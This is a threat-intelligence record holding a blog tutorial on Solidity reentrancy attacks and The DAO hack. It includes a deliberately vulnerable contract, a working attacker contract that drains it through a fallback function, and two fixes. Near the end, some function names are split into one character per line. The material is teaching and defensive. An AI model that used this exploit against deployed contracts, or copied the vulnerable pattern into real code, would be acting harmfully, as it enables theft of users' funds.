{
    "threat_intelligence": {
        "url": "https://blog.chain.link/reentrancy-attacks-and-the-dao-hack/https://blog.chain.link/reentrancy-attacks-and-the-dao-hack/",
        "timestamp": "2022-08-31 00:00:00",
        "original_content": "Reentrancy Attacks and The DAO Hack\nAugust 31, 2022  12 min read\nAuthor: Zubin Pratap\nReentrancy Attacks and The DAO Hack\nWho Is This for?\nA Brief History of The DAO Hack\nWhat Is a Reentrancy Attack in Solidity?\nReentrancy Attack Code Example\nFixing Reentrancy Vulnerability\nConclusion\nFacebook\nTwitter\nLinkedIn\nSubscribe to newsletter\nReentrancy attacks, like the one used in The DAO hack, are made possible by vulnerabilities in the way we structure Solidity code.\n\nIn this blog, we will explore one of the most infamous Solidity hacks of all time, which happened in the formative years of Ethereum smart contract development. This attack used the reentrancy exploit to compromise a DAO (decentralized autonomous organization) called The DAO. The hack used an exploit commonly referred to as a reentrancy attack.\n\nWho Is This for?\nThis blog assumes that you understand:\n\nThe basics of blockchain tech, specifically Ethereum.\nThe Ethereum Virtual Machine (EVM) runs on Ethereum nodes and is a decentralized, synchronized state machine.\nIn the context of Ethereum, a smart contract refers to software code that is written in the Solidity language and executes on the EVM.\nIn the context of Ethereum, the word \"account\" refers to an entity that may have a balance of ether, sends transactions on the Ethereum network, and is of two types-user-controlled or a deployed smart contract.\nYou do not need any knowledge of Solidity, as the code examples are quite lightweight. However, a basic grasp of any one programming language (statically or dynamically typed) is helpful.\n\nIf you want, you can also code along with a reentrancy attack tutorial here.\n\n\nA Brief History of The DAO Hack\nBy 2015, the nascent Ethereum community was starting to talk about DAOs-decentralized autonomous organizations. The idea behind these blockchain-powered communities was that they could coordinate human effort through the execution of verifiable code (specifically, smart contracts running on the Ethereum blockchain) and through decentralized decision-making on the community\u2019s protocols. In 2016, when the Ethereum mainnet was about a year old, a DAO called \"The DAO\" was created. It was a decentralized, community-controlled investment fund. It raised $150m worth of ether (about 3.54 million ETH) by selling its own community token. People purchased The DAO\u2019s community token by depositing ETH, and that ETH became the investment funds that The DAO would invest on behalf of its community of token-holding investors.\n\nAs it was so early in the evolution of Ethereum, smart contracts, and DAOs, there was a lot of excitement about these unprecedented ways to organize and coordinate human activity.  \n\nUnfortunately, less than 3 months after The DAO\u2019s launch, it was attacked by a \"blackhat\" hacker. Over the next few weeks, the hacker proceeded to drain most of the $150m worth of ETH from The DAO\u2019s smart contract. The hacker used what has come to be called a \"reentrancy\" attack. The name is descriptive, and we will dive more into the structure and technique of this attack shortly. But as you can imagine, this was a very serious breach of The DAO, a violation of the investors\u2019 trust, and a significant blow to the credibility of Ethereum.\n\nIt also created very deep ideological rifts. While industry participants and critics watched the funds being drained from The DAO, there was extensive debate about the best way to respond. On one end of the ideological spectrum was the view that the promise of cryptographically enabled blockchains was their immutability and tamper-resistance. Intervention, even for the right reasons, was still tampering. A truly trustless and tamper-resistant system would require no intervention, even if the consequences were serious-that is the price to be paid for decentralized tamper resistance. \n\nOn the other hand, people\u2019s savings were being stolen in slow motion and the damage to the public\u2019s confidence and optimism about blockchain technology demanded an intervention, even if it was just to protect people from losing their life savings, and the ethical obligation to prevent theft.\n\nAs these debates raged on, a \"whitehat\" hacker group was assembled to act as a counterstrike force. They were in the for-intervention camp, and they used the same hack-the reentrancy exploit-to attempt to drain The DAO faster than the attacker. The idea was to rescue the funds so that they could be refunded back to investors. And lots of refunds were made to DAO members, though many of the investors had exited the protocol through \"escape pods\" that let them extract their investment on the way out.\n\nMeanwhile, since the hacker was still draining millions out, the Ethereum core team was faced with a very challenging decision. One way to thwart the hacker would be to fork the Ethereum blockchain. This would be like changing history, where an alternate reality played out. In this example, by forking Ethereum, the new fork would operate as though the hack never happened, and the hacker\u2019s ill-gotten ETH would only be valid on the legacy fork of the network.  If users adopted the new fork and abandoned the old one, the hacker\u2019s ETH would be worth very little. This fork would invalidate the historical blocks that stored the transactions of the hacker\u2019s attack. But this extreme-sounding step was completely contrary to the principles underpinning Ethereum-this sort of intervention is the kind of centralized, \"unilateral\" action that Ethereum was meant to do away with.\n\nThose who voted in favor of the fork were supporting a world where there would be two parallel Ethereum blockchains. This vote won out with 85% of the votes, and the fork happened (despite some miners resisting as there was no actual defect in the Ethereum protocol). That\u2019s why there are now two Ethereum chains-Ethereum Classic and the Ethereum chain that we know today. Both have their native ETH tokens, and these tokens have very different prices in the market. You can see the Ethereum Foundation\u2019s announcement on the fork here.\n\nThe DAO was historically significant, and then the hack and the resulting decisions also became historical. \n\nBut how exactly did the hack work? Let\u2019s explore.\n\nWhat Is a Reentrancy Attack in Solidity?\nApplications that run on the Ethereum blockchain are called \"smart contracts\" (though there is no legal effect to them). Smart contracts are pieces of code, most commonly written in a language called Solidity, that are executed on the blockchain and can interact with external user accounts and other smart contracts on the Ethereum network. This free interaction between, and composability of, smart contracts is at the heart of their design. Moving payments between accounts is also at the heart of the philosophy. These principles are reflected in the way the Solidity language executes on the Ethereum Virtual Machine. \n\nThe reentrancy attack exploits the way something called \"fallback\" functions work. Fallback functions are special constructs in Solidity that are triggered in specific situations. The features of fallback functions are:\n\nThey are unnamed.\nThey are externally called (i.e. they cannot be called from inside the contract in which they are written).\nThere can be zero or one fallback functions per contract-no more.\nThey are automatically triggered when another contract calls a function in the fallback\u2019s enclosing smart contract, but that called function name does not match or exist.\nThey can also be triggered if ETH is sent to the fallback\u2019s enclosing contract, there is no accompanying \"calldata\" (a data location like memory or storage), and there is no receive() function declared-in this circumstance a fallback must be marked payable for it to trigger and receive the ETH.\nFallback functions can include arbitrary logic in them.\nIt is the fifth and sixth features of fallback functions that are exploited by the reentrancy hack. The hack also relies on a certain order of operations in the victim contract. So let\u2019s explore how this happens.\n\nIn the illustration below, the red and green boxes are smart contracts, and just to make it interesting, I\u2019ve presented the reentrancy attack against the backdrop of The DAO and its famous hack. This is a highly simplified version, stripped down to the essentials to understand reentrancy only, and the code below is not similar to The DAO\u2019s code.\n\nIn our illustration, The DAO\u2019s smart contract maintains a state variable called Balances that tracks each investor\u2019s investment in The DAO. This is separate from the smart contract\u2019s ETH balance, which is not stored in a state variable.\n\nThe hacker deploys a smart contract that acts as the \"investor,\" and this contract deposits some ETH into The DAO. This entitles the hacker to later call the withdraw() function in The DAO\u2019s smart contract. When the withdraw() function is eventually called, The DAO\u2019s contract sends ETH to the hacker. But the hacker\u2019s smart contract intentionally does not have a receive() function, so when it receives ETH from the withdraw request, the hacker\u2019s fallback function gets triggered. This fallback function could have been empty and still received the ETH, but instead it has some malicious code in it. \n\nThis code, immediately upon execution, calls The DAO\u2019s smart contract\u2019s withdraw() function again. This sets off a loop of calls because at this point the first call to withdraw() is still executing. It will only finish executing when the hacker contract\u2019s fallback function finishes, but that instead has re-called withdraw(), which kicks off a nested cycle of calls between the hacker contract and The DAO\u2019s smart contract.\n\nA diagram of how the reentrancy attack works\n\nEach time withdraw() is called, The DAO\u2019s smart contract tries to send the hacker an amount of ETH equivalent to the hacker\u2019s deposit. But, crucially, it does not update the hacker\u2019s account balance until after the ETH-sending transaction finishes. But the ETH sending transaction cannot finish until the hacker\u2019s fallback function finishes executing. So the DAO\u2019s contract keeps sending more and more ETH to the hacker without decrementing the hacker\u2019s balance-thus draining The DAO\u2019s funds. \n\nThis will become a little easier to follow in the code walkthrough below.\n\nReentrancy Attack Code Example\nLet\u2019s start with The DAO\u2019s code, in which a specific order of operations creates a vulnerability to a reentrancy attack.\n\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\n contract Dao {\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable {\n        require(msg.value >= 1 ether, \"Deposits must be no less than 1 Ether\");\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw() public {\n        // Check user's balance\n        require(\n            balances[msg.sender] >= 1 ether,\n            \"Insufficient funds.  Cannot withdraw\"\n        );\n        uint256 bal = balances[msg.sender];\n\n        // Withdraw user's balance\n        (bool sent, ) = msg.sender.call{value: bal}(\"\");\n        require(sent, \"Failed to withdraw sender's balance\");\n\n        // Update user's balance.\n        balances[msg.sender] = 0;\n    }\n\n    function daoBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\nNote the following:\n\nThe smart contract maintains a mapping of investor addresses and ETH balances. The invested ETH is held in the contract\u2019s balance itself, which is different from the balances state variable.\ndeposit() requires a minimum contribution of 1 ETH, and once a contribution is received, it increments the investor\u2019s balance.\nThe withdraw() function sends the withdrawn ETH to the investor (using msg.sender.call) before it resets their balance to zero. The send transaction does not finish executing until the hacker\u2019s fallback function finishes executing, so the hacker\u2019s balance is not set to zero until the fallback function finishes. This is the major vulnerability in The DAO\u2019s contract.\nNow let\u2019s examine the hacker\u2019s smart contract, which executed the exploit.\n\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface IDao {\n    function withdraw() external ;\n    function deposit()external  payable;\n }\n\ncontract Hacker{\n    IDao dao; \n\n    constructor(address _dao){\n        dao = IDao(_dao);\n    }\n\n    function attack() public payable {\n        // Seed the Dao with at least 1 Ether.\n        require(msg.value >= 1 ether, \"Need at least 1 ether to commence attack.\");\n        dao.deposit{value: msg.value}();\n\n        // Withdraw from Dao.\n        dao.withdraw();\n    }\n\n    fallback() external payable{\n        if(address(dao).balance >= 1 ether){\n            dao.withdraw();\n        }\n    }\n\n    function getBalance()public view returns (uint){\n        return address(this).balance;\n    }\n}\nThings to note here:\n\nThe attack() function deposits the hacker\u2019s \"investment\" in The DAO and then kicks off the attack by calling The DAO contract\u2019s withdraw() function, which we deconstructed in the previous paragraph.\nThe fallback function includes the malicious code. It checks that The DAO\u2019s contract still has some ETH left in it and then calls The DAO contract\u2019s withdraw() function. We saw in the previous paragraph that The DAO contract\u2019s withdraw() function does not update the hacker\u2019s account balance so long as the ETH-sending transaction is still executing. And that transaction keeps executing because the hacker\u2019s fallback function keeps calling withdraw(). This drains The DAO contract\u2019s ETH balance without updating the balances state variable. \nOnce The DAO contract\u2019s ETH balance is drained, the fallback() function will no longer execute the withdraw() function, and that will (finally!) complete the execution of the fallback() function, which will conclude the ETH-send transaction. Only then will the hacker\u2019s account balance be reset to zero, by which time The DAO will have no ETH left.\nFixing Reentrancy Vulnerability\nThere are a few ways to fix a reentrancy vulnerability, but in our example, the simplest fix is actually to change the order of operations in The DAO\u2019s withdraw() function so the caller\u2019s balance is reset to 0 before The DAO contract sends them their ether using the low-level call function. It would look like this:\n\nContract Dao {\n\u2026\n\n     function withdraw() public {\n        // Check user's balance\n        require(\n            balances[msg.sender] >= 1 ether,\n            \"Insufficient funds.  Cannot withdraw\"\n        );\n        uint256 bal = balances[msg.sender];\n\n        // Update user's balance.\n        balances[msg.sender] = 0;\n\n        // Withdraw user's balance\n        (bool sent, ) = msg.sender.call{value: bal}(\"\");\n        require(sent, \"Failed to withdraw sender's balance\");\n\n        // Update user's balance.\n        balances[msg.sender] = 0;\n    }\n}\nThis way, when the low-level call() function triggers the hacker contract\u2019s fallback() function, and that function tries to re-enter the withdraw() function, the hacker\u2019s balance is zero at the point of re-entry and the require() method will evaluate to false, thus reverting the transaction right there. This will then cause the original call to call() to move to return, and since it failed the value of sent will be false, which will cause the next line (require(sent, \"Failed to withdraw sender\u2019s balance\");) to revert.  \n\nThe hacker would have withdrawn their deposit and nothing more.\n\nAnother option would be for The DAO contract to use function modifiers to \"lock\" the withdraw() function while it is still executing so that any re-entry is blocked by the lock. We\u2019d achieve this by adding these lines to The DAO contract.\n\nContract Dao {\n   bool internal locked;\n\n   modifier noReentrancy() {\n        require(!locked, \"No reentrancy\");\n        locked = true;\n        _;\n        locked = false;\n    }\n\n //\u2026\u2026\n    function withdraw() public noReentrancy { \n\n    // withdraw logic goes here\u2026\n\n    }\n}\nThis reentrancy guard uses what\u2019s known as a mutex (mutually exclusive) flag pattern to protect the \nw\ni\nt\nh\nd\nr\na\nw\n(\n)\n function from being invoked while a previous invocation has not completed. So when the hacker contract\u2019s \nf\na\nl\nl\nb\na\nc\nk\n(\n)\n function tries to re-enter The DAO via the \nw\ni\nt\nh\nd\nr\na\nw\n(\n)\n function, the function modifier will get triggered and its \nr\ne\nq\nu\ni\nr\ne\n(\n)\n function will cause a revert with the message \"No reentrancy\".\n\nConclusion\nThis is, of course, a highly simplified walkthrough that explains the concept of reentrancy exploits using example code rather than production examples. And while I\u2019ve used The DAO hack as a backdrop to explain the reentrancy hack, the actual code of The DAO was very different. However, The DAO hack was based on the principles of \"reentrancy\"  because the hacker recursively withdrew funds without their balance being updated. You can examine The DAO\u2019s GitHub repo and see the attempted fixes of the balance update logic in the commit history.\n\nIf you\u2019re a developer and want to secure your smart contracts, dApp, or protocol, consider using Chainlink in your smart contract applications. For more learning and reference resources, check out the blockchain education hub, developer documentation, or reach out to an expert. You can also dive right into hooking up your smart contracts to real-world data via decentralized oracles. "
    }
}